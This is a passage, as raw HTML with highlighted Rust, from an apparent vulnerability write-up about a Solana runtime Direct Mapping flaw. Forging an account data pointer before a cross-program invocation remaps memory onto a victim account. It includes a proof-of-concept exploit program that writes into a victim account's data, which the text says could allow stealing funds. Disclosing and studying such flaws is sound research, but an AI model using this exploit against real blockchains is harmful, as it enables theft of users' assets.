</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">14</span><span>            memory_mapping</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">15</span><span>            account_info</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">as_ptr</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> _ </span><span class="token token" style="color:#cc99cd">as</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">16</span><span>            invoke_context</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">get_check_aligned</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">17</span><span>        </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">18</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">19</span><span>        </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">20</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">21</span><span>        </span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">22</span><span>            serialized_data</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">23</span><span>            vm_data_addr</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">24</span><span>            ref_to_len_in_vm</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">25</span><span>            serialized_len_ptr</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">26</span><span>        </span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">27</span><span>    </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">28</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">29</span><span>    </span><span class="token token" style="color:#f8c555">Ok</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#f8c555">CallerAccount</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">30</span><span>        vm_data_addr</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">31</span><span>        </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">32</span><span>    </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">33</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">By manipulating the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">AccountInfo.data</code> pointer in VM memory before triggering a CPI call, an attacker can forge the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">vm_data_addr</code> value. This causes <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">update_caller_account</code> to locate the wrong <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> and update its <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">host_addr</code> to point to the attacker&#x27;s target account data, effectively mapping the virtual memory of some <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">MemoryRegion</code> to a wrong host memory.</p>
<h2 class="text-4xl py-4 border-b border-white/10">A Failed Exploit that Led Us Deeper</h2>
<p class="text-xl py-3 text-pretty sm:text-justify">Though the primitive seems extremely powerful, the exploitation wasn&#x27;t as smooth as it might seems. After identifying the critical oversight, we started assessing its impact.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">Our first intuition is that since virtual memory are mapped incorrectly, it should be possible to bypass the memory write authorization checks, for exmaple, by mapping a writable virtual memory to some account data that should be readonly. This will be sufficient to allow attackers to steal funds by modifying token program accounts. Our first PoC implemented this idea, and it worked on an older version of Direct Mapping.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">use</span><span> </span><span class="token token" style="color:#e2777a">std</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>    ptr</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    mem</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>    </span><span class="token token" style="color:#e2777a">rc</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>    </span><span class="token token" style="color:#e2777a">cell</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span></span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span></span><span class="token token" style="color:#cc99cd">use</span><span> </span><span class="token token" style="color:#e2777a">solana_program</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span>    </span><span class="token token" style="color:#e2777a">account_info</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">AccountInfo</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span><span>    </span><span class="token token" style="color:#e2777a">instruction</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">10</span><span>        </span><span class="token token" style="color:#f8c555">AccountMeta</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">11</span><span>        </span><span class="token token" style="color:#f8c555">Instruction</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">12</span><span>    </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">13</span><span>    </span><span class="token token" style="color:#e2777a">program</span><span class="token token" style="color:#ccc">::</span><span>invoke_signed</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">14</span><span>    </span><span class="token token" style="color:#e2777a">entrypoint</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">15</span><span>        </span><span class="token token" style="color:#cc99cd">self</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">16</span><span>        </span><span class="token token" style="color:#f8c555">ProgramResult</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">17</span><span>    </span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">18</span><span>    </span><span class="token token" style="color:#e2777a">pubkey</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">19</span><span></span><span class="token token" style="color:#ccc">}</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">20</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">21</span><span></span><span class="token token macro" style="color:#f8c555">entrypoint!</span><span class="token token" style="color:#ccc">(</span><span>process_instruction</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">22</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">23</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">24</span><span></span><span class="token token" style="color:#999">// accounts[0] : LEVERAGE account controlled by ATTACKER and owned by EXPLOIT program </span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">25</span><span></span><span class="token token" style="color:#999">// accounts[1] : VICTIM account ATTACKER wants to modify</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">26</span><span></span><span class="token token" style="color:#999">// accounts[2] : BENIGN program that owns VICTIM account ATTACKER wants to modify</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">27</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">fn</span><span> </span><span class="token token function-definition" style="color:#f08d49">process_instruction</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">28</span><span>    _program_id</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">29</span><span>    accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f8c555">AccountInfo</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">30</span><span>    _instruction_data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">31</span><span></span><span class="token token" style="color:#ccc">)</span><span> </span><span class="token token" style="color:#ccc">-&gt;</span><span> </span><span class="token token" style="color:#f8c555">ProgramResult</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">32</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">33</span><span>    </span><span class="token token" style="color:#999">// trigger CoW here to prevent future issues</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">34</span><span>    accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">10</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">2</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">35</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">36</span><span>    </span><span class="token token" style="color:#999">// copy data pointers to force the following cpi update_caller_account to update incorrect region</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">37</span><span>    </span><span class="token token" style="color:#cc99cd">unsafe</span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">38</span><span>        </span><span class="token token" style="color:#e2777a">ptr</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">copy</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">39</span><span>            </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">40</span><span>                </span><span class="token token" style="color:#67cdcc">&amp;</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data </span><span class="token token" style="color:#999">//LEVERAGE</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">41</span><span>            </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">42</span><span>            </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">43</span><span>                </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">transmute</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#67cdcc">*</span><span class="token token" style="color:#cc99cd">const</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">44</span><span>                    </span><span class="token token" style="color:#67cdcc">&amp;</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data </span><span class="token token" style="color:#999">//VICTIM</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">45</span><span>                </span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">46</span><span>            </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">47</span><span>            </span><span class="token token" style="color:#e2777a">mem</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">size_of</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Rc</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">RefCell</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#cc99cd">mut</span><span> </span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#67cdcc">&gt;&gt;</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">48</span><span>        </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">49</span><span>    </span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">50</span><span>    </span><span class="token token" style="color:#f08d49">invoke_signed</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">51</span><span>        </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#f8c555">Instruction</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new_with_bincode</span><span class="token token" style="color:#ccc">(</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">52</span><span>            accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">2</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>key</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">53</span><span>            </span><span class="token token" style="color:#7ec699">b&quot;&quot;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">54</span><span>            </span><span class="token token macro" style="color:#f8c555">vec!</span><span class="token token" style="color:#ccc">[</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">55</span><span>                </span><span class="token token" style="color:#f8c555">AccountMeta</span><span class="token token" style="color:#ccc">::</span><span class="token token" style="color:#f08d49">new</span><span class="token token" style="color:#ccc">(</span><span>accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>key</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span> </span><span class="token token" style="color:#f08d49">false</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">56</span><span>            </span><span class="token token" style="color:#ccc">]</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">57</span><span>        </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">58</span><span>        </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">59</span><span>            accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">clone</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">60</span><span>        </span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">61</span><span>        </span><span class="token token" style="color:#67cdcc">&amp;</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">62</span><span>    </span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#67cdcc">?</span><span class="token token" style="color:#ccc">;</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">63</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">64</span><span>    </span><span class="token token" style="color:#999">// this will write to accounts[1].data due to corrupted region.host_addr</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">65</span><span>    accounts</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">0</span><span class="token token" style="color:#ccc">]</span><span class="token token" style="color:#ccc">.</span><span>data</span><span class="token token" style="color:#ccc">.</span><span class="token token" style="color:#f08d49">borrow_mut</span><span class="token token" style="color:#ccc">(</span><span class="token token" style="color:#ccc">)</span><span class="token token" style="color:#ccc">[</span><span class="token token" style="color:#f08d49">10</span><span class="token token" style="color:#ccc">]</span><span> </span><span class="token token" style="color:#67cdcc">=</span><span> </span><span class="token token" style="color:#f08d49">1</span><span class="token token" style="color:#ccc">;</span><span>
